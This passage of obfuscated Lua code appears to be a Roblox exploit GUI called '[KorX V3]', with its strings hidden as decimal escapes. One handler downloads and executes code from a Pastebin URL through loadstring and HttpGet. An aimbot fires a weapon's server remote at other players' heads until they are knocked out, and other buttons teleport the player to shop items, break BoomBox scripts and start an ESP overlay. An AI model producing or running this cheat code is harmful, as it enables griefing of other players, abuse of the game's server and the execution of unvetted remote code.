sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\70\71\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\59\32\116\111\103\103\108\101\32\98\121\32\112\114\101\115\115\105\110\103\32\39\113\39";
})
loadstring(game:HttpGet(('https://pastebin.com/raw/WScPcRNa'),true))()
end)
ik.MouseWheelBackward:connect(function()
local klqdte = game.Players.LocalPlayer.Backpack.Shotty 
local dtenbj = game.Players.LocalPlayer.Backpack.Shotty 
dtenbj.Parent = game.Players.LocalPlayer.Character
wait()
local dtenbj = game.Players.LocalPlayer.Character.Shotty 
dtenbj:Activate()
local klqdte = game.Players.LocalPlayer.Backpack.Shotty 
local klqdte = game.Players.LocalPlayer.Backpack.Shotty 
local dtenbj = game.Players.LocalPlayer.Backpack.Shotty 
dtenbj.Parent = game.Players.LocalPlayer.Character
for i,klqdte in pairs(game.Players:GetChildren())do
for i=1,10 do
math.random()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-4,-3,6)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-4,-7,3)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-4,-2,1)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-3,-2,4)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-7,-7,4)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-5,-1,8)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-3,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(1,-5,1)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-4,2,3)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-12,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-15,-6,1)
wait()
game.Players.LocalPlayer.Backpack.Shotty.GripPos =  Vector3.new(-14,-3,1) 
end
end
end)
ik.MouseWheelForward:connect(function()
local klqdte = game.Players.LocalPlayer.Backpack.Glock 
local _oiklqd = game.Players.LocalPlayer.Backpack.Glock 
_oiklqd.Parent = game.Players.LocalPlayer.Character
wait()
local _oiklqd = game.Players.LocalPlayer.Character.Glock 
_oiklqd:Activate()
local klqdte = game.Players.LocalPlayer.Backpack.Glock 
local klqdte = game.Players.LocalPlayer.Backpack.Glock 
local _oiklqd = game.Players.LocalPlayer.Backpack.Glock 
_oiklqd.Parent = game.Players.LocalPlayer.Character
for i,klqdte in pairs(game.Players:GetChildren())do
for i=1,10 do
math.random()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-4,-3,6)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-4,-7,3)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-4,-2,1)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-3,-2,4)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-7,-7,4)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-5,-1,8)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-3,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(1,-5,1)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-4,2,3)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-12,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-15,-6,1)
wait()
game.Players.LocalPlayer.Backpack.Glock.GripPos =  Vector3.new(-14,-3,1) 
end
end
end)
iklq.MouseWheelBackward:connect(function()
local klqdte = game.Players.LocalPlayer.Backpack.Knife 
local arcgpm_o = game.Players.LocalPlayer.Backpack.Knife 
arcgpm_o.Parent = game.Players.LocalPlayer.Character
wait()
local arcgpm_o = game.Players.LocalPlayer.Character.Knife 
arcgpm_o:Activate()
local klqdte = game.Players.LocalPlayer.Backpack.Knife 
local klqdte = game.Players.LocalPlayer.Backpack.Knife 
local arcgpm_o = game.Players.LocalPlayer.Backpack.Knife 
arcgpm_o.Parent = game.Players.LocalPlayer.Character
for i,klqdte in pairs(game.Players:GetChildren())do
for i=1,10 do
math.random()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-4,-3,6)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-4,-7,3)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-4,-2,1)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-3,-2,4)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-7,-7,4)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-5,-1,8)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-3,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(1,-5,1)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-4,2,3)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-12,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-15,-6,1)
wait()
game.Players.LocalPlayer.Backpack.Knife.GripPos =  Vector3.new(-14,-3,1) 
end
end
end)
iklq.MouseWheelForward:connect(function()
local klqdte = game.Players.LocalPlayer.Backpack.Pipe 
local enbjsfa = game.Players.LocalPlayer.Backpack.Pipe 
enbjsfa.Parent = game.Players.LocalPlayer.Character
wait()
local enbjsfa = game.Players.LocalPlayer.Character.Pipe 
enbjsfa:Activate()
local klqdte = game.Players.LocalPlayer.Backpack.Pipe 
local klqdte = game.Players.LocalPlayer.Backpack.Pipe 
local enbjsfa = game.Players.LocalPlayer.Backpack.Pipe 
enbjsfa.Parent = game.Players.LocalPlayer.Character
for i,klqdte in pairs(game.Players:GetChildren())do
for i=1,10 do
math.random()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-4,-3,6)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-4,-7,3)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-4,-2,1)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-3,-2,4)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-7,-7,4)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-5,-1,8)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-3,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(1,-5,1)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-4,2,3)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-12,-9,1)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-15,-6,1)
wait()
game.Players.LocalPlayer.Backpack.Pipe.GripPos =  Vector3.new(-14,-3,1) 
end
end
end)
oiklq.MouseWheelBackward:connect(function()
local klqdte = game.Players.LocalPlayer.Backpack.BoomBox 
local iklqdt = game.Players.LocalPlayer.Backpack.BoomBox 
iklqdt.Parent = game.Players.LocalPlayer.Character
wait()
local iklqdt = game.Players.LocalPlayer.Character.BoomBox 
iklqdt:Activate()
local klqdte = game.Players.LocalPlayer.Backpack.BoomBox 
local klqdte = game.Players.LocalPlayer.Backpack.BoomBox 
local iklqdt = game.Players.LocalPlayer.Backpack.BoomBox 
iklqdt.Parent = game.Players.LocalPlayer.Character
for i,klqdte in pairs(game.Players:GetChildren())do
for i=1,10 do
math.random()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-4,-3,6)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-4,-7,3)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-4,-2,1)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-3,-2,4)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-7,-7,4)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-5,-1,8)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-3,-9,1)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(1,-5,1)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-4,2,3)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-12,-9,1)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-15,-6,1)
wait()
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-14,-3,1) 
end
end
end)
oik.Name = "\65\73\77\66\79\84"
oik.Parent = qd
oik.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
oik.BackgroundTransparency = 0.30000001192093
oik.Position = UDim2.new(0.047786735, 0, 0.226640165, 0)
oik.Size = UDim2.new(0, 160, 0, 40)
oik.Font = Enum.Font.Garamond
oik.Text = "\65\73\77\66\79\84"
oik.TextColor3 = Color3.new(0, 0, 0)
oik.TextSize = 14
oik.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\65\105\109\98\111\116\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46\32\83\104\111\111\116\32\97\116\32\116\97\114\103\101\116\115\32\116\111\114\115\111\32\116\111\32\97\116\116\97\99\104\32\111\110\116\111\32\116\104\101\109\46";
})
klqdtenbjs = game.Players.LocalPlayer:getMouse()
klqdtenbjs.Button1Down:connect(function()
if game.Players:GetPlayerFromCharacter(klqdtenbjs.Target.Parent) then
local _oiklqdt = game.Players:GetPlayerFromCharacter(klqdtenbjs.Target.Parent)
if game.Players.LocalPlayer.Character:findFirstChildOfClass("\84\111\111\108") then
local m_oiklqdtenb_oiklqd = game.Players.LocalPlayer.Character:findFirstChildOfClass("\84\111\111\108")
if m_oiklqdtenb_oiklqd:findFirstChild("\70\105\114\101") then
if _oiklqdt ~= nil then
repeat
m_oiklqdtenb_oiklqd.Fire:FireServer(_oiklqdt.Character.Head.CFrame)
wait()
until _oiklqdt.Character:findFirstChild("\75\79")
end
end
end
end
end)
end)
oik.MouseButton2Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\82\97\112\105\100\32\71\108\111\99\107\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46\32\83\112\97\109\32\39\99\39\32\116\111\32\115\104\111\111\116";
})
local lqdtenbjs = game.Players.LocalPlayer
local klqdtenbjs = lqdtenbjs:GetMouse()
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_)
    if m_oiklqdtenb_ == "\99" then
for _,klqdte in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) and klqdte.Name == "\71\108\111\99\107" then
klqdte.Parent = game.Players.LocalPlayer.Character
end
end
for _,klqdte in pairs(game.Players.LocalPlayer:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) and klqdte.Name == "\71\108\111\99\107" then
klqdte.Parent = game.Players.LocalPlayer.Character
end
end
for i,klqdte in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) and klqdte.Name == "\71\108\111\99\107" then
klqdte:Activate()
wait(0.1)
end
end
end
end)
end)
_oi.Name = "\71\69\84\85\90\73"
_oi.Parent = qd
_oi.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
_oi.BackgroundTransparency = 0.30000001192093
_oi.Position = UDim2.new(0.047786735, 0, 0.320079535, 0)
_oi.Size = UDim2.new(0, 160, 0, 40)
_oi.Font = Enum.Font.Garamond
_oi.Text = "\71\69\84\32\85\90\73"
_oi.TextColor3 = Color3.new(0, 0, 0)
_oi.TextSize = 14
_oi.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\85\122\105\32\104\97\115\32\98\101\101\110\32\98\111\117\103\104\116\46";
})
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\85\122\105\32\124\32\36\49\53\48"].Head.CFrame
wait(0)
end)
_oi.MouseWheelBackward:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\85\122\105\32\124\32\36\49\53\48"].Head.CFrame
wait(0)
end)
_oi.MouseWheelForward:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\85\122\105\32\124\32\36\49\53\48"].Head.CFrame
wait(0)
end)
m_oi.Name = "\71\69\84\83\65\87\69\68\79\70\70"
m_oi.Parent = qd
m_oi.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
m_oi.BackgroundTransparency = 0.30000001192093
m_oi.Position = UDim2.new(0.047786735, 0, 0.417495042, 0)
m_oi.Size = UDim2.new(0, 160, 0, 40)
m_oi.Font = Enum.Font.Garamond
m_oi.Text = "\71\69\84\32\83\65\87\69\68\45\79\70\70"
m_oi.TextColor3 = Color3.new(0, 0, 0)
m_oi.TextSize = 14
m_oi.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\83\97\119\101\100\32\79\102\102\32\104\97\115\32\98\101\101\110\32\98\111\117\103\104\116\46";
})
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\83\97\119\101\100\32\79\102\102\32\124\32\36\49\53\48"].Head.CFrame
wait(0)
end)
m_oi.MouseWheelForward:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\83\97\119\101\100\32\79\102\102\32\124\32\36\49\53\48"].Head.CFrame
wait(0)
end)
m_oi.MouseWheelBackward:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\83\97\119\101\100\32\79\102\102\32\124\32\36\49\53\48"].Head.CFrame
wait(0)
end)
pm_o.Name = "\71\69\84\71\76\79\67\75"
pm_o.Parent = qd
pm_o.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
pm_o.BackgroundTransparency = 0.30000001192093
pm_o.Position = UDim2.new(0.047786735, 0, 0.512922466, 0)
pm_o.Size = UDim2.new(0, 160, 0, 40)
pm_o.Font = Enum.Font.Garamond
pm_o.Text = "\71\69\84\32\71\76\79\67\75"
pm_o.TextColor3 = Color3.new(0, 0, 0)
pm_o.TextSize = 14
pm_o.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\71\108\111\99\107\32\104\97\115\32\98\101\101\110\32\98\111\117\103\104\116\46";
})
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\71\108\111\99\107\32\124\32\36\50\48\48"].Head.CFrame
wait(0)
end)
pm_o.MouseWheelForward:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\71\108\111\99\107\32\124\32\36\50\48\48"].Head.CFrame
wait(0)
end)
pm_o.MouseWheelBackward:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local cgpm_oik = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    lqdtenbjs.Character.HumanoidRootPart.CFrame = game.Workspace["\71\108\111\99\107\32\124\32\36\50\48\48"].Head.CFrame
wait(0)
end)
gpm_.Name = "\66\111\111\109\98\111\120\32\84\105\116\108\101"
gpm_.Parent = qd
gpm_.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
gpm_.BackgroundTransparency = 0.5
gpm_.Position = UDim2.new(0.047786735, 0, 0.617062867, 0)
gpm_.Size = UDim2.new(0, 160, 0, 34)
cgpm.Parent = gpm_
cgpm.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
cgpm.BackgroundTransparency = 0.5
cgpm.Size = UDim2.new(0, 160, 0, 34)
cgpm.Font = Enum.Font.Garamond
cgpm.Text = "\91\66\111\111\109\98\111\120\93"
cgpm.TextColor3 = Color3.new(0, 0, 0)
cgpm.TextScaled = true
cgpm.TextSize = 14
cgpm.TextWrapped = true
rcgp.Name = "\66\79\79\77\80\65\67\75"
rcgp.Parent = qd
rcgp.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
rcgp.BackgroundTransparency = 0.30000001192093
rcgp.Position = UDim2.new(0.047786735, 0, 0.803180873, 0)
rcgp.Size = UDim2.new(0, 160, 0, 40)
rcgp.Font = Enum.Font.Garamond
rcgp.Text = "\66\79\79\77\80\65\67\75"
rcgp.TextColor3 = Color3.new(0, 0, 0)
rcgp.TextSize = 14
rcgp.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\97\99\107\112\97\99\107\32\66\111\111\109\98\111\120\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
game.Players.LocalPlayer.Backpack.BoomBox.GripUp =  Vector3.new(0,0,20)
game.Players.LocalPlayer.Backpack.BoomBox.GripRight =  Vector3.new(-10,0,1)
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-1.4,-1,1)
end)
arcg.Name = "\66\79\79\77\67\65\83\69"
arcg.Parent = qd
arcg.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
arcg.BackgroundTransparency = 0.30000001192093
arcg.Position = UDim2.new(0.047786735, 0, 0.90059638, 0)
arcg.Size = UDim2.new(0, 160, 0, 40)
arcg.Font = Enum.Font.Garamond
arcg.Text = "\66\79\79\77\67\65\83\69"
arcg.TextColor3 = Color3.new(0, 0, 0)
arcg.TextSize = 14
arcg.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\114\105\101\102\99\97\115\101\32\66\111\111\109\98\111\120\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(0,0.8,0)
game.Players.LocalPlayer.Backpack.BoomBox.GripRight =  Vector3.new(-6,0,90)
game.Players.LocalPlayer.Backpack.BoomBox.GripForward =  Vector3.new(6,-120,0)
end)
farc.Name = "\66\79\79\77\71\76\73\84\67\72"
farc.Parent = qd
farc.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
farc.BackgroundTransparency = 0.30000001192093
farc.Position = UDim2.new(0.047786735, 0, 0.703777373, 0)
farc.Size = UDim2.new(0, 160, 0, 40)
farc.Font = Enum.Font.Garamond
farc.Text = "\71\76\73\84\67\72"
farc.TextColor3 = Color3.new(0, 0, 0)
farc.TextSize = 14
farc.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\71\108\105\116\99\104\32\66\111\111\109\98\111\120\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46\32\77\97\107\101\32\115\117\114\101\32\121\111\117\32\112\108\97\121\32\109\117\115\105\99\32\102\105\114\115\116\32\98\101\102\111\114\101\32\115\101\108\101\99\116\105\110\103\32\71\108\105\116\99\104\46";
})
local sfarcg = _oiklqdtenbj.Character:FindFirstChild("\66\111\111\109\66\111\120")
if sfarcg then
sfarcg.Server:Destroy()
sfarcg.Client:Destroy()
end
end)
sfa.Name = "\77\105\115\99\32\77\101\110\117"
sfa.Parent = arc
sfa.BackgroundColor3 = Color3.new(1, 1, 1)
sfa.BackgroundTransparency = 0.60000002384186
sfa.Position = UDim2.new(0.408350319, 0, 0.309140772, 0)
sfa.Size = UDim2.new(0, 177, 0, 356)
jsfa.Name = "\77\105\115\99\32\84\105\116\108\101"
jsfa.Parent = sfa
jsfa.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
jsfa.BackgroundTransparency = 0.5
jsfa.Position = UDim2.new(0.0534364507, 0, 0.0384112, 0)
jsfa.Size = UDim2.new(0, 160, 0, 34)
qdtenb_4.Parent = jsfa
qdtenb_4.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
qdtenb_4.BackgroundTransparency = 0.5
qdtenb_4.Position = UDim2.new(0.00624999963, 0, -1.86264515e-09, 0)
qdtenb_4.Size = UDim2.new(0, 160, 0, 34)
qdtenb_4.Font = Enum.Font.Garamond
qdtenb_4.Text = "\91\77\105\115\99\93"
qdtenb_4.TextColor3 = Color3.new(0, 0, 0)
qdtenb_4.TextScaled = true
qdtenb_4.TextSize = 14
qdtenb_4.TextWrapped = true
nbj.Name = "\72\69\76\80\47\69\88\84\82\65"
nbj.Parent = sfa
nbj.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
nbj.BackgroundTransparency = 0.30000001192093
nbj.Position = UDim2.new(0.0534364507, 0, 0.170742095, 0)
nbj.Size = UDim2.new(0, 160, 0, 40)
nbj.Font = Enum.Font.Garamond
nbj.TextScaled = true
nbj.Text = "\72\69\76\80\47\69\88\84\82\65"
nbj.TextColor3 = Color3.new(255, 0, 0)
nbj.TextSize = 14
enbj.Name = "\69\83\80"
enbj.Parent = sfa
enbj.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
enbj.BackgroundTransparency = 0.30000001192093
enbj.Position = UDim2.new(0.047786735, 0, 0.307709962, 0)
enbj.Size = UDim2.new(0, 160, 0, 40)
enbj.Font = Enum.Font.Garamond
enbj.Text = "\69\83\80"
enbj.TextColor3 = Color3.new(0, 0, 0)
enbj.TextSize = 14
enbj.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\69\115\112\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\59\32\112\117\116\32\105\110\32\115\101\108\101\99\116\101\100\32\112\108\97\121\101\114\115\32\110\97\109\101\32\101\120\97\99\116\108\121\46";
})
local bjsfarc = Instance.new("\83\99\114\101\101\110\71\117\105")
local nbjsfa = Instance.new("\70\114\97\109\101")
local enbjsfar = Instance.new("\70\114\97\109\101")
local lqdtenbjs = Instance.new("\84\101\120\116\66\111\120")
local dtenbjs = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local qdtenb = Instance.new("\84\101\120\116\76\97\98\101\108")
bjsfarc.Name = "\67\117\115\116\111\109\32\69\83\80"
bjsfarc.Parent = game.CoreGui
nbjsfa.Name = "\116\111\112\98\97\114"
nbjsfa.Parent = bjsfarc
nbjsfa.Active = true
nbjsfa.BackgroundColor3 = Color3.new(255, 0, 0)
nbjsfa.BackgroundTransparency = 0.25
nbjsfa.BorderSizePixel = 0
nbjsfa.Draggable = true
nbjsfa.Position = UDim2.new(0.446646333, 0, 0.474074066, 0)
nbjsfa.Size = UDim2.new(0, 140, 0, 35)
enbjsfar.Name = "\87\105\110\100\111\119"
enbjsfar.Parent = nbjsfa
enbjsfar.Active = true
enbjsfar.BackgroundColor3 = Color3.new(0, 0, 0)
enbjsfar.BackgroundTransparency = 0.5
enbjsfar.BorderSizePixel = 0
